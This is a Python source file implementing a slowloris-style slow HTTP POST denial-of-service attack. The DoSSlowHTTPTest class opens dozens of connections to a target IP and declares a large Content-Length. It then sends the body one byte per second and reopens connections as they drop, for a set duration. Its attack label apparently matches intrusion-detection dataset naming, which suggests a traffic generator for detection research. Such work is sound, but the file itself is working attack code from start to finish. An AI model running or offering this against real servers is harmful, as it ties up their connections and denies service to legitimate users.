"""SlowHTTPTest DoS attack implementation"""

import asyncio
import logging
import random
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class DoSSlowHTTPTest(BaseAttack):
    """SlowHTTPTest attack - slow HTTP POST"""
    
    def get_attack_type(self) -> str:
        return "DoS attacks-SlowHTTPTest"
    
    def get_default_port(self) -> int:
        return 80
    
    async def _slow_post(self, connection_id):
        """Send slow POST request"""
        port = self.target_port or self.get_default_port()
        
        try:
            reader, writer = await asyncio.open_connection(self.target_ip, port)
            
            # Send POST header
            writer.write(b"POST / HTTP/1.1\r\n")
            writer.write(f"Host: {self.target_ip}\r\n".encode())
            writer.write(b"Content-Length: 1000000\r\n")
            writer.write(b"Connection: keep-alive\r\n")
            writer.write(b"\r\n")
            await writer.drain()
            
            self.packets_sent += 1
            
            # Send body very slowly
            for i in range(100):
                writer.write(b"X")
                await writer.drain()
                self.packets_sent += 1
                await asyncio.sleep(1)  # 1 second between each byte
            
            writer.close()
            await writer.wait_closed()
            
        except Exception as e:
            logger.debug(f"Connection {connection_id} failed: {e}")
    
    async def _execute_attack(self):
        """Execute SlowHTTPTest attack"""
        duration = self.parameters.get('duration', 300)
        connections = self.parameters.get('connections', 50)
        
        logger.info(f"SlowHTTPTest: Starting {connections} slow POST connections")
        
        start_time = asyncio.get_event_loop().time()
        tasks = []
        
        # Start initial connections
        for i in range(connections):
            task = asyncio.create_task(self._slow_post(i))
            tasks.append(task)
            await asyncio.sleep(0.1)
        
        # Monitor and restart failed connections
        while (asyncio.get_event_loop().time() - start_time) < duration:
            # Check for completed tasks
            done_tasks = [t for t in tasks if t.done()]
            for task in done_tasks:
                tasks.remove(task)
                # Start new connection
                new_task = asyncio.create_task(self._slow_post(len(tasks)))
                tasks.append(new_task)
            
            await asyncio.sleep(5)
        
        # Cancel remaining tasks
        for task in tasks:
            task.cancel()
        
        logger.info(f"SlowHTTPTest: Attack complete. Sent {self.packets_sent} packets")

